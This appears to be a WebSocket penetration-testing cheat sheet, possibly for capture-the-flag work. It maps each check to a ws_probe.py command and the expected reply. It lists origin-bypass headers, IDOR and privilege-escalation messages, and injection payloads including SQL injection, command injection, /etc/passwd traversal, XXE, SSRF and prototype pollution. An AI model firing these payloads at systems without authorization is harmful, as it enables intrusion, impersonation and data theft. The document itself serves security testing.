# Probe map — the check → the command → the oracle

## The handshake probes — the full set

| Check | The command | The oracle |
|---|---|---|
| baseline | `ws_probe.py "$WS/ws" --message '{}'` | a `101` |
| origin | `ws_probe.py "$WS/ws" --origin '<foreign>' --message '{}'` | `101`=accept / `403`=check |
| origin-null | `ws_probe.py "$WS/ws" --origin 'null' --message '{}'` | `101`=bypass |
| origin-file | `ws_probe.py "$WS/ws" --origin 'file://' --message '{}'` | `101`=bypass |
| origin-subdomain | `ws_probe.py "$WS/ws" --origin 'https://target.evil.com'` | `101`=endswith |
| origin-suffix | `ws_probe.py "$WS/ws" --origin 'https://target.com.evil.com'` | `101`=suffix |
| origin-nosent | `ws_probe.py "$WS/ws" --message '{}'` | `101`=no-Origin |
| binding-cookie | `ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'` | the bound identity |
| binding-bearer | `ws_probe.py "$WS/ws" --headers 'Authorization: Bearer x' --message '{"action":"me"}'` | the bound identity |
| binding-token | `ws_probe.py "$WS/ws?token=<jwt>" --message '{"action":"me"}'` | the bound identity |
| unauth | `ws_probe.py "$WS/ws" --message '{"action":"me"}'` | data/drop |
| subproto | `ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: <alt>'` | `101`=accepted |
| samesite | `curl -sI "$BASE/login" \| grep -i set-cookie` | `SameSite=<x>` |

## The message probes — the full set

| Check | The command | The oracle |
|---|---|---|
| idor-id | `--message '{"action":"read","id":"<other>"}'` | another's object |
| idor-doc | `--message '{"action":"open","doc":"<other>"}'` | another's doc |
| idor-room | `--message '{"action":"history","room":"<other>"}'` | another's room |
| membership | `--message '{"action":"join","room":"<x>"}'` | the feed |
| subscribe | `--message '{"action":"subscribe","channel":"<x>"}'` | the feed |
| action-admin | `--message '{"action":"admin"}'` | a privileged reply |
| action-debug | `--message '{"action":"debug"}'` | a privileged reply |
| action-eval | `--message '{"action":"eval","code":"x"}'` | an eval reply |
| action-flag | `--message '{"action":"flag"}'` | the flag |
| action-config | `--message '{"action":"config","key":"x"}'` | the config |
| role-grant | `--message '{"action":"x","role":"admin"}'` | the grant |
| spoof-from | `--message '{"from":"<other>","action":"x"}'` | acts as other |
| spoof-user | `--message '{"user_id":"<other>","action":"x"}'` | acts as other |
| inject-sqli | `--message '{"q":"'"'"' OR 1=1--"}'` | injected rows |
| inject-ssti | `--message '{"name":"{{7*7}}"}'` | `49` |
| inject-cmdi | `--message '{"host":"x;id"}'` | `uid=...` |
| inject-lfi | `--message '{"file":"../../etc/passwd"}'` | `root:x:` |
| inject-xxe | `--message '{"xml":"<!ENTITY ...>"}'` | the entity data |
| inject-ssrf | `--message '{"url":"http://169.254..."}'` | a fetch reply |
| inject-deser | `--message '{"data":"<serialized>"}'` | the deser output |
| inject-pollute | `--message '{"obj":{"__proto__":{"isAdmin":true}}}'` | a polluted obj |
| write-transfer | `--message '{"action":"transfer","to":"me","amount":N}'` | a state-change |
| write-broadcast | `--message '{"action":"broadcast","text":"x"}'` | a cross-client write |
| subscribe-idor | `--message '{"action":"subscribe","channel":"<other>"}'` | the feed |
| resume | `--message '{"session_id":"<old>"}'` | a resumed context |
| history | `--message '{"action":"history","room":"<x>","from":0}'` | the backlog |
| graphql-sub | `--message '{"type":"subscribe","payload":{"query":"subscription{...}"}}'` | the pushed data |

## The transport probes

| Check | The command | The oracle |
|---|---|---|
| socketio-event | `--message '42["<event>",{...}]'` | the event reply |
| socketio-ns | `--message '42/<ns>,["ev",{...}]'` | the ns event |
| sockjs | `--message 'a["{\"action\":\"x\"}"]'` | the inner reply |
| stomp-send | `--message 'SEND destination:/app/x'` | the SEND reply |
| stomp-sub | `--message 'SUBSCRIBE destination:/<x>'` | a MESSAGE push |
| graphql-sub | `--message '{"type":"subscribe",...}'` | the data |
| mqtt-sub | a binary `SUBSCRIBE {topic}` | a PUBLISH |
| protobuf | `proto_decode.py frame.bin` | the field-stream |

## The map-discipline

- one probe per connection — a fresh socket per mutation
- the control frame FIRST — the known-good shape
- the oracle is the verbatim reply — not a `pong`/`ok`
- each probe records `cell: <check>: <probe> -> <verdict>`
